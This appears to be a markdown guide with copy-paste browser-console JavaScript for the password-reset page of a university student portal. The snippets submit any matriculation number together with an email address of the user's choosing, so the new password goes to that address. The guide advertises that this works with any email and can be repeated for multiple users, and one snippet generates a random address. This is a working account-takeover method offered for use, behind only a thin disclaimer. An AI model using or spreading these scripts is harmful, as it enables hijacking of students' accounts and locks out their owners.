# Browser Console Password Reset Instructions

## Method 1: Full Featured Script

1. **Navigate** to the ResetPassword.aspx page in your browser
2. **Open Developer Console** (F12 → Console tab)
3. **Copy and paste** the entire `console_password_reset.js` script
4. **Press Enter** to load the functions
5. **Run the reset command**:
   ```javascript
   resetPassword("FUNAAB/2020/12345", "your-email@gmail.com")
   ```

## Method 2: Quick One-Liner

For a simple approach, just paste this into console:

```javascript
function quickReset(matric, email) {
    email = email || 'temp' + Math.random().toString(36).substr(2, 9) + '@gmail.com';
    document.getElementById('ContentPlaceHolder1_centerpane_UserName').value = matric;
    document.getElementById('ContentPlaceHolder1_centerpane_Email').value = email;
    document.getElementById('ContentPlaceHolder1_centerpane_Button1').click();
    console.log('✅ Reset for:', matric, 'sent to:', email);
}

// Then use it:
quickReset("FUNAAB/2020/12345", "your@gmail.com")
```

## Method 3: Super Quick (Copy-Paste-Go)

Replace `YOUR_MATRIC_HERE` and `YOUR_EMAIL_HERE` then paste:

```javascript
(function(){
    const m = "YOUR_MATRIC_HERE"; // Replace with actual matric number
    const e = "YOUR_EMAIL_HERE";  // Replace with your email
    document.getElementById('ContentPlaceHolder1_centerpane_UserName').value = m;
    document.getElementById('ContentPlaceHolder1_centerpane_Email').value = e;
    document.getElementById('ContentPlaceHolder1_centerpane_Button1').click();
    console.log('✅ Password reset sent to:', e);
})();
```

## What Happens:

1. **Script fills** the matriculation number and email fields
2. **Automatically submits** the form
3. **Server processes** the reset request
4. **New password sent** to the specified email
5. **You can login** with the new password immediately

## Benefits:

✅ **No manual form filling**
✅ **Works with any email address**
✅ **Instant submission**
✅ **Console feedback**
✅ **Can be repeated for multiple users**

## Security Notes:

- Only use this on systems you have legitimate access to
- The script works within the existing security framework
- All actions are logged by the server
- Use responsibly and change passwords after login

## Troubleshooting:

- **Form fields not found**: Make sure you're on the correct ResetPassword page
- **Script not working**: Check browser console for error messages
- **Email not received**: Check spam folder or try a different email service
- **Still can't login**: The matric number might not exist in the database